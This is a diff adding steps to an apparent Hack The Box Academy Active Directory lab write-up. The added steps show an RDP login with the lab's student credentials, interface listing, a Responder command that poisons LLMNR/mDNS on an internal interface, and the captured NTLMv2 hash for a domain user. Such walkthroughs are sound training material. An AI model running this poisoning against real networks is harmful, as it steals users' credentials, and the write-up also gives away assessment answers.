@@ -8,6 +8,12 @@ Apply what you learned in this module to compromise the domain and answer the qu
 
 1- **Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?**
 
+To begin, I connected to the target machine using RDP with the provided credentials:
+```c
+xfreerdp /v:10.129.102.204 /u:htb-student /p:HTB_@cademy_stdnt! /drive:Desktop,/home/htb-ac-1310789/Desktop
+```
+Once connected, I opened a Parrot terminal and checked the available network interfaces:
+```c
 ┌─[htb-student@skills-par01]─[~]
 └──╼ $ifconfig
 docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
@@ -46,6 +52,20 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX packets 299  bytes 31213 (30.4 KiB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
+The output revealed multiple interfaces, including ens224, which was connected to an internal network. Since ens224 was part of an internal network, I decided to run Responder against it to capture authentication attempts:
+```c
+sudo responder -I ens224 -v
+```
+
+After running Responder, I successfully intercepted an NTLMv2 hash from a user attempting to authenticate over the network:
+```c
+[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
+[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
+[SMB] NTLMv2-SSP Client   : 172.16.7.3
+[SMB] NTLMv2-SSP Username : INLANEFREIGHT\AB920
+[SMB] NTLMv2-SSP Hash     : AB920::INLANEFREIGHT:176f3b0810525d52:4D099A42FE282DF41F240733F23A9768:0101000000000000804C7F58BB9FDB0117D82F0F578E217B0000000002000800380034003800590001001E00570049004E002D005A003400390033005500490055003200570047004A0004003400570049004E002D005A003400390033005500490055003200570047004A002E0038003400380059002E004C004F00430041004C000300140038003400380059002E004C004F00430041004C000500140038003400380059002E004C004F00430041004C0007000800804C7F58BB9FDB010600040002000000080030003000000000000000000000000020000045D8985FF53F7DB1DACDDB6F0FB6F822B0B96E4674D43EF6D100F08948F9CDB20A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
+```
+
 
 
 ```c
